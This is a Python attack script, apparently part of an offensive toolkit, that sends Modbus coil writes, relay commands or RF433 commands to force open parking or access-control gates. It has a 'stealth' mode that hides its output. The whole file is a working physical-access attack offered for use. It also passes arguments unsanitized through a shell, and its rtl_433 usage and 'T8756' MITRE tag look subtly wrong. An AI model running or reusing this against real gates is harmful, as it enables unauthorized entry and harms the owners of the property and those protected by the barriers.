#!/usr/bin/env python3
# modules/attacks/gate_control_override.py

import argparse
import os
import json
import time
import subprocess
from datetime import datetime

LOG_PATH = "results/gate_control_override.log"
DASHBOARD_ALERT = "webgui/alerts.json"
MITRE_TTP = "T8756"  # Custom tag for OT physical actuator control

def log_event(message):
    os.makedirs("results", exist_ok=True)
    with open(LOG_PATH, "a") as f:
        f.write(f"{datetime.utcnow().isoformat()} | {message}\n")
    print(f"[GATE] {message}")

def send_alert(message):
    os.makedirs("webgui", exist_ok=True)
    alert = {
        "agent": "gate_control_override",
        "type": "physical",
        "message": message,
        "timestamp": time.time()
    }
    with open(DASHBOARD_ALERT, "a") as f:
        f.write(json.dumps(alert) + "\n")

def override_gate(protocol, command, interface, stealth=False):
    if protocol == "modbus":
        cmd = f"modbus-cli write --host {interface} --coil 1 {command}"
    elif protocol == "relay":
        cmd = f"python3 -m relay_controller --port {interface} --state {command}"
    elif protocol == "rf433":
        cmd = f"rtl_433 -r {interface} -M newmodel -R {command}"
    else:
        log_event(f"[!] Unsupported protocol: {protocol}")
        return

    try:
        if stealth:
            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
        else:
            subprocess.run(cmd, shell=True, timeout=5)
        log_event(f"[+] Gate override command sent via {protocol} with {command}")
        send_alert(f"Gate override triggered ({protocol} - {command})")
    except Exception as e:
        log_event(f"[!] Execution failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Override parking or access control gate via RF/Modbus/Relay")
    parser.add_argument("--protocol", required=True, choices=["modbus", "relay", "rf433"], help="Control protocol")
    parser.add_argument("--command", required=True, help="Command to send (e.g. ON, OFF, 1, 0)")
    parser.add_argument("--interface", required=True, help="Interface or host (e.g. /dev/ttyUSB0, 192.168.0.100)")
    parser.add_argument("--stealth", action="store_true", help="Suppress output and run silently")
    args = parser.parse_args()

    override_gate(args.protocol, args.command, args.interface, stealth=args.stealth)
